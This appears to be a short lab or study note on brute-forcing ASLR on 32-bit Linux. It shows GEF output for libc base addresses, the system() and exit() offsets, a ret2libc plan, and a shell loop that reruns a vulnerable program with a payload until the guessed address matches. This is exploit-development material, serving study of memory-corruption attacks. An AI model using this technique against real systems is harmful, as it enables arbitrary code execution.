### Bruteforcing ASLR

* Running `vmmap` inside Gef in two different runs gives two different libc base addresses
```bash
0xf7d|75|000 0xf7d|98|000 0x00000000 r-- /usr/lib32/libc.so.6
0xf7c|f6|000 0xf7d|19|000 0x00000000 r-- /usr/lib32/libc.so.6
```
* We see that only one octet changes each time the program runs with the ASLR activated

* We can collect the system() and exit() addresses inside Gef too
```bash
gef➤  p system
$3 = {<text variable, no debug info>} 0xf7d45560 <system>
gef➤  xinfo 0xf7d45560
────────────────────────────────────────────── xinfo: 0xf7d45560 ──────────────────────────────────────────────
Page: 0xf7d19000  →  0xf7e97000 (size=0x17e000)
Permissions: r-x
Pathname: /usr/lib32/libc.so.6
Offset (from page): 0x2c560
Inode: 0
Segment: .text (0xf7d191b0-0xf7e96f19)
Offset (from segment): 0x2c3b0
Symbol: system


gef➤  p exit
$4 = {<text variable, no debug info>} 0xf7d34290 <exit>
gef➤  xinfo 0xf7d34290
────────────────────────────────────────────── xinfo: 0xf7d34290 ──────────────────────────────────────────────
Page: 0xf7d19000  →  0xf7e97000 (size=0x17e000)
Permissions: r-x
Pathname: /usr/lib32/libc.so.6
Offset (from page): 0x1b290
Inode: 0
Segment: .text (0xf7d191b0-0xf7e96f19)
Offset (from segment): 0x1b0e0
Symbol: exit
```

### Notes
* Only one octet changes each time the program runs with the ASLR activated
* We wanna target the system and exit functions
* Under ASLR, for a given library, the offsets don't change, only the base addresses do
* We can either add addresses manually or use pwntools to do it.

### PLAN
1. Setting up one of the collected libc address in our payload.
2. run the vulnerable program in an infinite loop on until the libc address we set up in the payload matches the libc address used by the vulnerable program.


```bash
$ while [ True ]; do ./vulnerable $(cat payload); done
```
